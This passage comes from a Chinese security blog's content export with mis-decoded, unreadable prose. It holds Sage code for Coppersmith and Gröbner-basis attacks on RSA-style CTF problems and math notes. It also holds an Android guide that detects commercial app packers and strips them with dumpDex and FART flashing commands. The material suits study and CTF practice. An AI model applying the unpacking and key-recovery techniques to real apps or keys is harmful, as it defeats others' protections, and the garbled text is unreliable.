algorithmï¼ˆLLLï¼‰æ–¹æ³•ã€‚ Coppersmithæ”»å‡»å¯è§£æ ¹ä¸Šç•Œï¼š$N^{\\frac{\\beta^2}{d}-\\epsilon}$ã€‚ $d$ ä¸ºå¾…æ±‚è§£å¤šé¡¹å¼çš„é˜¶ï¼Œ$\\beta$ ä¸ºæœ‰é™åŸŸ $\\mathbb{Z}(p)$ ä¸Šå¤šé¡¹å¼ä¸­ $p$ æ»¡è¶³ $p&gt;N^{\\beta}$ï¼Œ$\\epsilon$ æ˜¯è°ƒèŠ‚å‚æ•°ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#Sage# å•å…ƒPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (a + x)^e - croot = f.small_roots(X=2^256, beta=1)[0] # find root &lt; 2^256 with factor = n#è°ƒå‚ï¼Œå¢å¤§æ ¼#beta=0.48, epsilon=0.02### å¤šå…ƒ1import itertoolsdef small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m+1): base = N^(m-i) * f^i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1/factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B*monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return []PR.&lt;a, b&gt; = PolynomialRing(Zmod(n))f = 4*r^2*a*b + 2*r*(a+b) + 1 - nroots = small_roots(f, (2^256, 2^256), m=3)a, b = roots[0]PR.&lt;x, y&gt; = PolynomialRing(Zmod(q)) # n = x*y# PR.&lt;x, y&gt; = Polygen(RealField(1000)) # n â‰ˆ x*yf = (2^256 * a + x) * s - (2^256 + 1) * y * b - croots = small_roots(f, [2^256, 2^256], m=4, d=4)### å¤šå…ƒ2ï¼ˆäºŒå…ƒï¼‰def bivariate(pol, XX, YY, kk=3): N = pol.parent().characteristic() f = pol.change_ring(ZZ) PR,(x,y) = f.parent().objgens() idx = [ (k-i, i) for k in range(kk+1) for i in range(k+1) ] monomials = list(map(lambda t: PR( x**t[0]*y**t[1] ), idx)) # collect the shift-polynomials g = [] for h,i in idx: if h == 0: g.append( y**h * x**i * N ) else: g.append( y**(h-1) * x**i * f ) # construct lattice basis M = Matrix(ZZ, len(g)) for row in range( M.nrows() ): for col in range( M.ncols() ): h,i = idx[col] M[row,col] = g[row][h,i] * XX**h * YY**i # LLL B = M.LLL() PX = PolynomialRing(ZZ, &#x27;xs&#x27;) xs = PX.gen() PY = PolynomialRing(ZZ, &#x27;ys&#x27;) ys = PY.gen() # Transform LLL-reduced vectors to polynomials H = [ ( i, PR(0) ) for i in range( B.nrows() ) ] H = dict(H) for i in range( B.nrows() ): for j in range( B.ncols() ): H[i] += PR( (monomials[j]*B[i,j]) / monomials[j](XX, YY) ) # Find the root poly1 = H[0].resultant(H[1], y).subs(x=xs) poly2 = H[0].resultant(H[2], y).subs(x=xs) poly = gcd(poly1, poly2) x_root = poly.roots()[0][0] poly1 = H[0].resultant(H[1], x).subs(y=ys) poly2 = H[0].resultant(H[2], x).subs(y=ys) poly = gcd(poly1, poly2) y_root = poly.roots()[0][0] return x_root, y_rootPR.&lt;x,y&gt; = PolynomialRing(Zmod(N))f = (x*2**923)+p0+yx, y = bivariate(f, 2^101, 2^101)#å…¶ä»–å¤šå…ƒload(&#x27;coppersmith.sage&#x27;)P.&lt;x, y&gt; = PolynomialRing(GF(p))f = 2^170 * a^2 + 2^86 * a * x + x^2 - 2^85 * b + c - yroots = coron(f, X=2^85, Y=2^85, k=1, debug=True) â€‹ GrÃ¶bneråŸºç©ºé—´å’ŒåŸŸ ç†æƒ³ $F=\\{f_1,\\cdots,f_k\\}$ æ˜¯ä¸€ä¸ªå¤šé¡¹å¼é›†åˆï¼Œå…¶ç”Ÿæˆçš„ç†æƒ³ä¸ºé›†åˆå…ƒç´ çš„çº¿æ€§ç»„åˆï¼Œç»„åˆç³»æ•°ä¹Ÿæ˜¯å¤šé¡¹å¼ $\\langle f_1,\\cdots,f_k \\rangle=\\biggl\\{ \\sum\\limits_{i=1}^k g_if_i \\vert g_1,\\cdots,g_k \\in K[x_1,\\cdots,x_n] \\biggr\\}$ï¼Œ å…¶ä¸­ $R=K[x_1,\\cdots,x_n]$ æ˜¯åœ¨åŸŸ $K$ ä¸Šçš„å¤šé¡¹å¼ç¯ã€‚ ç¯ $R$ çš„ä¸€ä¸ªéç©ºå­é›† $I$ ï¼Œå¦‚æœå¯¹äº $R$ çš„ä¸¤ä¸ªä»£æ•°è¿ç®—ï¼Œæ»¡è¶³æ¡ä»¶ï¼šå¯¹ä»»æ„ $a,b \\in I,r \\in R$ï¼Œæœ‰ $a-b \\in I,ra \\in I$ï¼Œåˆ™ç§° $I$ æ˜¯ç¯ $R$ çš„ä¸€ä¸ªå·¦ç†æƒ³ã€‚ ç¯ $R$ çš„ä¸€ä¸ªéç©ºå­é›† $I$ ï¼Œå¦‚æœå¯¹äº $R$ çš„ä¸¤ä¸ªä»£æ•°è¿ç®—ï¼Œæ»¡è¶³æ¡ä»¶ï¼šå¯¹ä»»æ„ $a,b \\in I,r \\in R$ï¼Œæœ‰ $a-b \\in I,ar \\in I$ï¼Œåˆ™ç§° $I$ æ˜¯ç¯ $R$ çš„ä¸€ä¸ªå³ç†æƒ³ã€‚ ç¯ $R$ çš„ä¸€ä¸ªéç©ºå­é›† $I$ ï¼Œå¦‚æœæ—¢æ˜¯å·¦ç†æƒ³åˆæ˜¯å³ç†æƒ³ï¼Œç§° $I$ ä¸º $R$ çš„åŒè¾¹ç†æƒ³ï¼Œé€šå¸¸ç®€ç§° $I$ ä¸º $R$ çš„ç†æƒ³ã€‚ æ ¹æ®ä»¥ä¸‹å®šç†ï¼Œæ¯ä¸ªç†æƒ³éƒ½æœ‰ä¸€ä¸ªç”Ÿæˆé›†ï¼š Hilbert åŸºå®šç†ï¼š æ¯ä¸ªå¤šé¡¹å¼ç†æƒ³ $I \\subseteq K[x_1,\\cdots,x_n]$ éƒ½æœ‰ä¸€ä¸ªæœ‰é™ç”Ÿæˆé›†ï¼Œå³å­˜åœ¨ $g_1,\\cdots,g_t \\in I$ï¼Œä½¿å¾— $I=\\langle g_1,\\cdots,g_t \\rangle$ã€‚ GrÃ¶bneråŸºå®šä¹‰ å¯¹äºå•é¡¹å¼åºä¸‹çš„å¤šé¡¹å¼ç¯ $K[x_1,\\cdots,x_n]$ï¼Œç†æƒ³ $I \\subseteq K[x_1,\\cdots,x_n]$ çš„é $\\{0\\}$ ä¸”æ»¡è¶³ $\\langle \\mathrm{LT}(g_1),\\cdots,\\mathrm{LT}(g_t) \\rangle=\\langle \\mathrm{LT}(I) \\rangle$ çš„æœ‰é™ç”Ÿæˆé›† $G=\\{g_1,\\cdots,g_t\\}$ï¼Œç§°ä¸ºGrÃ¶bneråŸºã€‚å®šä¹‰ $\\{0\\}$ çš„GrÃ¶bneråŸºä¸ºç©ºé›† $\\varnothing$ã€‚ GrÃ¶bneråŸºçš„ä¸¤ä¸ªåº”ç”¨ï¼Œåˆ¤æ–­ä¸€ä¸ªå¤šé¡¹å¼æ˜¯å¦å±äºå½“å‰çš„GrÃ¶bneråŸºç”Ÿæˆçš„ç†æƒ³ ï¼ˆå³Ideal Membership problemï¼‰ï¼Œå¦ä¸€ä¸ªåº”ç”¨å°±æ˜¯è§£æ–¹ç¨‹ç»„ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#Sage###ZZ/QQ/RR#Example-1P.&lt;x, y&gt; = PolynomialRing(QQ)f1 = x^2 + x*y - 10f2 = x^3 + x^2*y - 20f3 = x^4 + x*y^3 - 70G = Ideal([f1, f2, f3]).groebner_basis()print(G)#Example-2PR = PolynomialRing(Zmod(N), &#x27;x&#x27;, len(Cs))x = PR.gens()f1 = (65537*x[0] - 66666*x[1] + 12345*x[2] - x[3])f2 = x[0] + x[1] + x[2] - sFs = [f1, f2]Fs.extend([(x[i]**e - Cs[i]) for i in range(l)])I = Ideal(Fs)B = I.groebner_basis()print(B)m = &#x27;&#x27;for b in B: assert b.degree() == 1 mi = ZZ(-b(0, 0, 0, 0)) print(mi)###Zmod(p)from sage.matrix.matrix2 import Matrix def resultant(f1, f2, var): return Matrix.determinant(f1.sylvester_matrix(f2, var))P.&lt;Rx, Ry, Qx, Qy&gt; = PolynomialRing(Zmod(p))f1 = Ry^2 - Rx^3 - a*Rx - bf2 = Qy^2 - Qx^3 - a*Qx - bf3 = (Qy + Ry)^2 + (Qx - Rx)^2 * (- Rx - Qx - Px)f4 = (- Qy - Ry) * (Rx - Px) + (Qx - Rx) * (- Ry - Py)f5 = Rx * Qx - NG = Ideal([f1, f2, f3, f4, f5]).groebner_basis()#ç»“å¼+çŸ©é˜µå­å¼ï¼ˆè¥¿å°”ç»´æ–¯ç‰¹çŸ©é˜µï¼‰print(&#x27;[!] computing resultant h1...&#x27;)h1 = resultant(G[0], G[1], Rx) # Ry, Qx, Qyprint(&#x27;[!] computing resultant h2...&#x27;)h2 = resultant(G[0], G[2], Rx) # Ry, Qx, Qyprint(&#x27;[!] computing resultant h3...&#x27;)h3 = resultant(G[3], G[4], Rx) # Ry, Qx, Qyprint(&#x27;[!] computing resultant h4...&#x27;)h4 = resultant(G[3], G[5], Rx) # Ry, Qx, Qyprint(&#x27;[!] computing resultant h5...&#x27;)h5 = resultant(h1, h2, Ry) # Qx, Qyprint(&#x27;[!] computing resultant h6...&#x27;)h6 = resultant(h3, h4, Ry) # Qx, Qyprint(&#x27;[!] computing resultant h7...&#x27;)h7 = resultant(h5, h6, Qy) # Qxprint(&#x27;[!] computing resultant h8...&#x27;)h8 = resultant(h7, f5, Qx) # Rxroots = h8.univariate_polynomial().roots()p, q = [ZZ(t[0]) for t in roots if ZZ(t[0]).is_prime()] â€‹ Diffie-Hellmanå¯†é’¥äº¤æ¢ï¼ˆDHå¯†é’¥äº¤æ¢ / DHKEï¼‰Diffie-Hellmanå¯†é’¥äº¤æ¢ï¼ˆDHKEï¼‰æ˜¯ç”±Whitfield Diffieå’ŒMartin Hellmanåœ¨1976å¹´æå‡ºçš„ã€‚å¯†é’¥äº¤æ¢æ–¹æ¡ˆæä¾›äº†å®é™…ä¸­å¯†é’¥åˆ†é…é—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼Œå³å…è®¸åŒæ–¹é€šè¿‡ä¸å®‰å…¨çš„ä¿¡é“è¿›è¡Œäº¤æµè·å¾—ä¸€ä¸ªå…±åŒå¯†é’¥ã€‚è®¸å¤šå…¬å¼€å’Œå•†ä¸šå¯†ç åè®®ä¸­éƒ½å®ç°äº†è¿™ç§åŸºæœ¬çš„å¯†é’¥åè®®æŠ€æœ¯ã€‚ åŸºäºä¹˜æ³•ç¾¤ï¼š Aå’ŒBåå•†ä¸€ä¸ªæœ‰é™å¾ªç¯ç¾¤ $G$ å’Œå®ƒçš„ä¸€ä¸ªç”Ÿæˆå…ƒ $g$ï¼Œä¸€ä¸ªå¤§ç´ æ•° $p$ï¼› Aç”Ÿæˆä¸€ä¸ªéšæœºæ•° $a$ï¼Œè®¡ç®— $A=g^a \\pmod p$ï¼Œå°† $A$ å‘é€ç»™Bï¼› Bç”Ÿæˆä¸€ä¸ªéšæœºæ•° $b$ï¼Œè®¡ç®— $B=g^b \\pmod p$ï¼Œå°† $B$ å‘é€ç»™Aï¼› Aè®¡ç®— $K=B^a \\pmod p=(g^b)^a \\pmod p$ï¼Œå¾—åˆ°å…±äº«å¯†é’¥ $K$ï¼› Bè®¡ç®— $K=A^b \\pmod p=(g^a)^b \\pmod p$ï¼Œå¾—åˆ°å…±äº«å¯†é’¥ $K$ã€‚ åŸºäºåŠ æ³•ç¾¤ï¼š Aå’ŒBåå•†ä¸€ä¸ªæœ‰é™å¾ªç¯ç¾¤ $G$ å’Œå®ƒçš„ä¸€ä¸ªç”Ÿæˆå…ƒ $g$ï¼Œä¸€ä¸ªå¤§ç´ æ•° $p$ï¼› Aç”Ÿæˆä¸€ä¸ªéšæœºæ•° $a$ï¼Œè®¡ç®— $A=ag \\pmod p$ï¼Œå°† $A$ å‘é€ç»™Bï¼› Bç”Ÿæˆä¸€ä¸ªéšæœºæ•° $b$ï¼Œè®¡ç®— $B=bg \\pmod p$ï¼Œå°† $B$ å‘é€ç»™Aï¼› Aè®¡ç®— $K=aB \\pmod p=a(bg) \\pmod p$ï¼Œå¾—åˆ°å…±äº«å¯†é’¥ $K$ï¼› Bè®¡ç®— $K=bA \\pmod p=b(ag) \\pmod p$ï¼Œå¾—åˆ°å…±äº«å¯†é’¥ $K$ã€‚ â€‹ çŸ©é˜µå¿«é€Ÿå¹‚æ ¹æ®æ–æ³¢é‚£å¥‘çš„é€’æ¨å…¬å¼ï¼š $\\left\\{\\begin{array}{cl} f(n)&amp;=&amp;f(n-1)+f(n-2) \\\\ f(n-1)&amp;=&amp;f(n-1) \\end{array}\\right. \\Rightarrow \\begin{bmatrix} f(n) \\\\ f(n-1) \\end{bmatrix}=\\begin{bmatrix} 1 &amp; 1 \\\\ 1 &amp; 0 \\end{bmatrix}\\begin{bmatrix} f(n-1) \\\\ f(n-2) \\end{bmatrix}$ è®¾ $\\begin{bmatrix} f(n) \\\\ f(n-1) \\end{bmatrix}=F(n)$ï¼Œåˆ™ $F(n)=\\begin{bmatrix} 1 &amp; 1 \\\\ 1 &amp; 0 \\end{bmatrix} \\cdot F(n-1)$ æŠŠçŸ©é˜µå½“æˆä¸€ä¸ªå¸¸æ•°æ¥çœ‹ï¼Œå³ç±»ä¼¼ç­‰æ¯”æ•°åˆ—é€’æ¨å…¬å¼ï¼Œå³ï¼š $\\begin{bmatrix} f(n) \\\\ f(n-1) \\end{bmatrix}=\\begin{bmatrix} 1 &amp; 1 \\\\ 1 &amp; 0 \\end{bmatrix}^{n-1}\\begin{bmatrix} f(1) \\\\ f(0) \\end{bmatrix}$ æ‰€ä»¥æœ€ç»ˆè½¬æ¢æˆä¸€ä¸ªæ±‚è§£çŸ©é˜µå¹‚è¿ç®—çš„é€šé¡¹å…¬å¼ã€‚ æ™®é€šå¿«é€Ÿå¹‚ç®—æ³•ï¼š 12345678910int qpow(int x, int n, int m) &#123; int res = 1; while (n) &#123; if (n &amp; 1) res = res * x % m; x = x * x % m; n &gt;&gt;= 1; &#125; return res;&#125; æ ¹æ®çŸ©é˜µä¹˜æ³•è¿ç®—æ”¹å†™ä¸ºçŸ©é˜µå¿«é€Ÿå¹‚ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;iostream&gt;using namespace std;#define N 2struct matrix &#123; int m[N][N]; matrix() &#123; memset(m, 0, sizeof(m)); &#125; void prt();&#125;;void matrix::prt() &#123; for (int i = 0; i &lt; N; ++ i) &#123; for (int j = 0; j &lt; N; ++ j) &#123; cout &lt;&lt; this -&gt; m[i][j] &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; &#125;&#125;matrix operator * (const matrix a, const matrix b) &#123; matrix ans; for (int i = 0; i &lt; N; ++ i) &#123; for (int j = 0; j &lt; N; ++ j) &#123; for(int k = 0; k &lt; N; ++ k) &#123; ans.m[i][j] += a.m[i][k] * b.m[k][j]; &#125; &#125; &#125; return ans;&#125;matrix qpow(matrix x, int n) &#123; matrix res; for (int i = 0; i &lt; N; ++ i) &#123; res.m[i][i] = 1; &#125; while (n) &#123; if (n &amp; 1) res = res * x; x = x * x; n &gt;&gt;= 1; &#125; return res;&#125;int fib(int n) &#123; matrix a; a.m[0][0] = a.m[1][0] = a.m[0][1] = 1; matrix base; base.m[0][0] = 1; matrix ans = qpow(a, n - 1); ans = ans * base; return ans.m[0][0];&#125;int main() &#123; cout &lt;&lt; fib(1) &lt;&lt; endl; // 1 cout &lt;&lt; fib(2) &lt;&lt; endl; // 1 cout &lt;&lt; fib(3) &lt;&lt; endl; // 2 cout &lt;&lt; fib(4) &lt;&lt; endl; // 3 cout &lt;&lt; fib(5) &lt;&lt; endl; // 5 cout &lt;&lt; fib(6) &lt;&lt; endl; // 8 cout &lt;&lt; fib(7) &lt;&lt; endl; // 13&#125; å…¶ä»–é€’æ¨å…³ç³» $f(n)=af(n-1)+bf(n-2)\\Longrightarrow \\begin{bmatrix} f(n) \\\\ f(n-1) \\end{bmatrix}=\\begin{bmatrix} a &amp; b \\\\ 1 &amp; 0 \\end{bmatrix}\\begin{bmatrix} f(n-1) \\\\ f(n-2) \\end{bmatrix}$ $f(n)=af(n-1)+bf(n-2)+c \\Longrightarrow \\begin{bmatrix} f(n) \\\\ f(n-1) \\\\ c \\end{bmatrix}=\\begin{bmatrix} a &amp; b &amp; 1 \\\\ 1 &amp; 0 &amp; 0 \\\\ 0 &amp; 0 &amp; 1 \\end{bmatrix}\\begin{bmatrix} f(n-1) \\\\ f(n-2) \\\\ c\\end{bmatrix}$ $f(n)=ac^n+bf(n-1)+d \\Longrightarrow \\begin{bmatrix} f(n) \\\\ c^n \\\\ d \\end{bmatrix}=\\begin{bmatrix} b &amp; ac &amp; 1 \\\\ 0 &amp; c &amp; 0 \\\\ 0 &amp; 0 &amp; 1 \\end{bmatrix}\\begin{bmatrix} f(n-1) \\\\ c^{n-1} \\\\ d\\end{bmatrix}$ $S(n)=A \\cdot S(n-1)+A\\Longrightarrow \\begin{bmatrix} S(n) \\\\ A \\end{bmatrix}=\\begin{bmatrix} A &amp; E \\\\ 0 &amp; E \\end{bmatrix}\\begin{bmatrix} S(n-1) \\\\ A \\end{bmatrix}$ 123456789101112131415161718192021222324#ä»¥2x2çŸ©é˜µç›¸ä¹˜ä¸ºä¾‹m = [[1 for i in range(2)]for j in range(2)]m[1][1] = 0n = int(input())def mulMatrix(x,y): #å®šä¹‰äºŒé˜¶çŸ©é˜µç›¸ä¹˜çš„å‡½æ•° ans = [[0 for i in range(2)]for j in range(2)] for i in range(2): for j in range(2): for k in range(2): ans[i][j] += x[i][k] * y[k][j] return ansdef quickMatrix(m,n): E = [[0 for i in range(2)]for j in range(2)] #å…ˆå®šä¹‰ä¸€ä¸ªå•ä½çŸ©é˜µ for i in range(2): E[i][i] = 1 while(n): if n % 2 != 0: E = mulMatrix(E,m) m = mulMatrix(m,m) n &gt;&gt;= 1 return Eprint(quickMatrix(m,n)) â€‹ ä½©å°”æ–¹ç¨‹ / Pellæ–¹ç¨‹è‹¥ä¸€ä¸ªä¸å®šæ–¹ç¨‹å…·æœ‰å½¢å¼ï¼š $x^2-ny^2=1$ åˆ™ç§°æ­¤äºŒå…ƒäºŒæ¬¡ä¸å®šæ–¹ç¨‹ä¸ºä½©å°”æ–¹ç¨‹ã€‚ è‹¥ $n$ æ˜¯å®Œå…¨å¹³æ–¹æ•°ï¼Œåˆ™è¿™ä¸ªæ–¹ç¨‹å¼åªæœ‰å¹³å‡¡è§£ã€‚å¯¹äºå…¶ä½™æƒ…å†µï¼Œæ‹‰æ ¼æœ—æ—¥è¯æ˜äº†ä½©å°”æ–¹ç¨‹æ€»æœ‰éå¹³å‡¡è§£ã€‚è€Œè¿™äº›è§£å¯ç”± $\\sqrt{n}$ çš„è¿åˆ†æ•°æ±‚å‡ºã€‚ è®¾ $\\frac{p}{q}$ æ˜¯ $\\sqrt{n}$ çš„è¿åˆ†æ•°è¡¨ç¤ºï¼š$[a_0;a_1,a_2,a_3,\\cdots]$ çš„æ¸è¿›åˆ†æ•°åˆ—ï¼Œç”±è¿åˆ†æ•°ç†è®ºçŸ¥å­˜åœ¨ $i$ ä½¿å¾— $(p_i,q_i)$ ä¸ºä½©å°”æ–¹ç¨‹çš„è§£ã€‚å–å…¶ä¸­æœ€å°çš„ $i$ï¼Œå°†å¯¹åº”çš„ $(p_i,q_i)$ ç§°ä¸ºä½©å°”æ–¹ç¨‹çš„åŸºæœ¬è§£ï¼ˆæœ€å°è§£ï¼‰ï¼Œè®°ä½œ $(x_1,y_1)$ï¼Œåˆ™æ‰€æœ‰çš„è§£ $(x_i,y_i)$ å¯è¡¨ç¤ºæˆå¦‚ä¸‹å½¢å¼ï¼š $x_i+y_i\\sqrt{n}=(x_1+y_1\\sqrt{n})^i$ æˆ–è€…ç”±ä»¥ä¸‹çš„é€’æ¨å¼å¾—åˆ°ï¼š $x_{i+1} = x_1x_i+ny_1y_i$ $y_{i+1} = x_1y_i+y_1x_i$ 1234567891011def solve_pell(N, numTry = 100): cf = continued_fraction(sqrt(N)) for i in range(numTry): denom = cf.denominator(i) numer = cf.numerator(i) if numer^2 - N * denom^2 == 1: return numer, denom return None, NoneN = solve_pell(N)","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://lazzzaro.github.io/tags/%E7%AE%97%E6%B3%95/"}],"author":"Lazzaro"},{"title":"Androidé€†å‘","slug":"reverse-Androidé€†å‘","date":"2020-05-10T09:52:00.000Z","updated":"2022-09-01T15:48:46.861Z","comments":true,"path":"2020/05/10/reverse-Androidé€†å‘/","permalink":"https://lazzzaro.github.io/2020/05/10/reverse-Android%E9%80%86%E5%90%91/","excerpt":"","text":"apkå£³æ£€æµ‹12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import zipfile&#x27;&#x27;&#x27;first,get namelist from apksecond,matching the featuresthrid,julging for the shellTypeso easy~~by zsdlove2018/8/24 Morning&#x27;&#x27;&#x27;shellfeatures=&#123; &quot;libchaosvmp.so&quot;:&quot;å¨œè¿¦&quot;, &quot;libddog.so&quot;:&quot;å¨œè¿¦&quot;, &quot;libfdog.so&quot;:&quot;å¨œè¿¦&quot;, &quot;libedog.so&quot;:&quot;å¨œè¿¦ä¼ä¸šç‰ˆ&quot;, &quot;libexec.so&quot;:&quot;çˆ±åŠ å¯†&quot;, &quot;libexecmain.so&quot;:&quot;çˆ±åŠ å¯†&quot;, &quot;ijiami.dat&quot;:&quot;çˆ±åŠ å¯†&quot;, &quot;ijiami.ajm&quot;:&quot;çˆ±åŠ å¯†ä¼ä¸šç‰ˆ&quot;, &quot;libsecexe.so&quot;:&quot;æ¢†æ¢†å…è´¹ç‰ˆ&quot;, &quot;libsecmain.so&quot;:&quot;æ¢†æ¢†å…è´¹ç‰ˆ&quot;, &quot;libSecShell.so&quot;:&quot;æ¢†æ¢†å…è´¹ç‰ˆ&quot;, &quot;libDexHelper.so&quot;:&quot;æ¢†æ¢†ä¼ä¸šç‰ˆ&quot;, &quot;libDexHelper-x86.so&quot;:&quot;æ¢†æ¢†ä¼ä¸šç‰ˆ&quot;, &quot;libprotectClass.so&quot;:&quot;360&quot;, &quot;libjiagu.so&quot;:&quot;360&quot;, &quot;libjiagu_art.so&quot;:&quot;360&quot;, &quot;libjiagu_x86.so&quot;:&quot;360&quot;, &quot;libegis.so&quot;:&quot;é€šä»˜ç›¾&quot;, &quot;libNSaferOnly.so&quot;:&quot;é€šä»˜ç›¾&quot;, &quot;libnqshield.so&quot;:&quot;ç½‘ç§¦&quot;, &quot;libbaiduprotect.so&quot;:&quot;ç™¾åº¦&quot;, &quot;aliprotect.dat&quot;:&quot;é˜¿é‡Œèšå®‰å…¨&quot;, &quot;libsgmain.so&quot;:&quot;é˜¿é‡Œèšå®‰å…¨&quot;, &quot;libsgsecuritybody.so&quot;:&quot;é˜¿é‡Œèšå®‰å…¨&quot;, &quot;libmobisec.so&quot;:&quot;é˜¿é‡Œèšå®‰å…¨&quot;, &quot;libtup.so&quot;:&quot;è…¾è®¯&quot;, &quot;libexec.so&quot;:&quot;è…¾è®¯&quot;, &quot;libshell.so&quot;:&quot;è…¾è®¯&quot;, &quot;mix.dex&quot;:&quot;è…¾è®¯&quot;, &quot;lib/armeabi/mix.dex&quot;:&quot;è…¾è®¯&quot;, &quot;lib/armeabi/mixz.dex&quot;:&quot;è…¾è®¯&quot;, &quot;libtosprotection.armeabi.so&quot;:&quot;è…¾è®¯å¾¡å®‰å…¨&quot;, &quot;libtosprotection.armeabi-v7a.so&quot;:&quot;è…¾è®¯å¾¡å®‰å…¨&quot;, &quot;libtosprotection.x86.so&quot;:&quot;è…¾è®¯å¾¡å®‰å…¨&quot;, &quot;libnesec.so&quot;:&quot;ç½‘æ˜“æ˜“ç›¾&quot;, &quot;libAPKProtect.so&quot;:&quot;APKProtect&quot;, &quot;libkwscmm.so&quot;:&quot;å‡ ç»´å®‰å…¨&quot;, &quot;libkwscr.so&quot;:&quot;å‡ ç»´å®‰å…¨&quot;, &quot;libkwslinker.so&quot;:&quot;å‡ ç»´å®‰å…¨&quot;, &quot;libx3g.so&quot;:&quot;é¡¶åƒç§‘æŠ€&quot;, &quot;libapssec.so&quot;:&quot;ç››å¤§&quot;, &quot;librsprotect.so&quot;:&quot;ç‘æ˜Ÿ&quot;&#125;def shellDetector(apkpath): shellType=&quot;&quot; shellsign=&quot;&quot; flag=True zipfiles=zipfile.ZipFile(apkpath) nameList=zipfiles.namelist() for fileName in nameList: for shell in shellfeatures.keys(): if shell in fileName: flag=True shellType=shellfeatures[shell] shellsign=shell break else: flag=False if flag==True: print(&quot;ç»æ£€æµ‹ï¼Œè¯¥apkä½¿ç”¨äº†&quot;+shellType+&quot;è¿›è¡ŒåŠ å›º&quot;)if __name__ == &#x27;__main__&#x27;: shellDetector(&quot;test.apk&quot;) â€‹ è„±å£³æ–¹æ³• dumpDexdumpDex-Androidè„±å£³ï¼šhttps://github.com/WrBug/dumpDex dumpDexæ˜¯ä¸€ä¸ªgithubä¸Šå¼€æºçš„xposedæ’ä»¶ï¼Œå¯ä»¥ç”¨æ¥è„±æ‰å½“å‰å¸‚åœºä¸Šå¤§éƒ¨åˆ†çš„å£³ã€‚ ä¸€ã€å‡†å¤‡å·¥ä½œ é¦–å…ˆéœ€è¦rootçš„æ‰‹æœºä¸€éƒ¨ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯åä¸ºè£è€€6ï¼ˆandroid5.1ï¼‰ï¼Œå®‰è£…å¥½xposedæ¡†æ¶ dumpDexé¡¹ç›®åœ°å€ï¼šhttps://github.com/WrBug/dumpDex å¯ä»¥ç›´æ¥ä¸‹è½½releaseçš„apkï¼Œä¹Ÿå¯ä»¥è‡ªè¡Œç¼–è¯‘æ‰“åŒ…æˆapkå®‰è£…åˆ°æ‰‹æœºï¼Œæˆ‘ä¸ªäººæ¯”è¾ƒå–œæ¬¢ç¬¬äºŒç§ã€‚ å®‰è£…å¥½apkåï¼Œå¯¹äº32ä½æ‰‹æœºï¼Œéœ€è¦å°†lib/armeabi-v7a/libnativeDump.soå¤åˆ¶åˆ°/data/local/tmp/libnativeDump.soï¼Œæƒé™è®¾ç½®ä¸º777ã€‚ äºŒã€å¼€å§‹è„±å£³ åç¼–è¯‘apkåï¼Œæ ¹æ®ç‰¹å¾å‘ç°æ˜¯ä½¿ç”¨äº†æ¢†æ¢†åŠ å›º å®‰è£…æ’ä»¶ï¼Œé‡å¯æ‰‹æœºï¼Œæ‰“å¼€åŠ å›ºçš„apkï¼Œè„±å£³çš„åçš„dexä¼šåœ¨/data/data/å¯¹åº”åŒ…è·¯å¾„/dumpæ–‡ä»¶å¤¹ä¸‹ è„±å£³åçš„dexå¦‚å›¾æ‰€ç¤ºï¼Œå…¶ä¸­æœ‰ä¸€éƒ¨åˆ†æ˜¯å£³çš„dexï¼Œéœ€è¦è‡ªå·±è‡ªè¡Œé€‰æ‹©ä¸€ä¸‹ ä¸‰ã€è¡¥å……è¯´æ˜ è®¾ç½®æƒé™é—®é¢˜ï¼ŒGitHubä¸Šæœ‰è¯¦ç»†è¯´æ˜ ç¼–è¯‘è¿‡ç¨‹æœ‰å¯èƒ½ä¼šæœ‰è®©ä½ è®¾ç½®ç­¾åçš„ä¸€ä¸ªé—®é¢˜ï¼Œç›´æ¥è®¾ç½®æˆä½ çš„debugç­¾åå°±å¯ å¦‚æœåŠ å›ºåçš„åŒ…ååœ¨PackageInfo.javaä¸­æ²¡æœ‰å¯¹åº”çš„ï¼Œè‡ªè¡ŒåŠ åˆ°PackageInfo.javaä¸­å³å¯ åº”ç”¨æœ‰å¯èƒ½æœ‰å¡æ­»çŠ¶å†µæˆ–è€…æ‰‹æœºé‡å¯çŠ¶å†µï¼Œä½†åº”è¯¥èƒ½è„±å‡ºå£³æ¥ï¼Œå»ºè®®å¤šè„±å‡ é æºç éƒ¨åˆ†å¦‚æœæ˜¯ç™¾åº¦ç³»çš„å£³ï¼Œç›´æ¥è¿”å›å¹¶æœ‰æ²¡dumpï¼Œå› ä¸ºè¿˜æ²¡é‡åˆ°è¿‡ç™¾åº¦çš„å£³ï¼Œæš‚ä¸çŸ¥é“å…·ä½“åŸå›  FART1ã€å®‰è£…é•œåƒ ä»https://github.com/hanbinglengyue/FARTä¸Šä¸‹è½½é•œåƒï¼Œç„¶åæŒ‰ç…§https://www.bodkin.ren/index.php/archives/513/åˆ·æœºï¼Œä¸­é—´æ²¡æœ‰é‡åˆ°ä»€ä¹ˆé—®é¢˜ã€‚ 123456789adb reboot bootloaderfastboot oem unlockfastboot flash system system.imgfastboot flash userdata userdata.imgfastboot flash 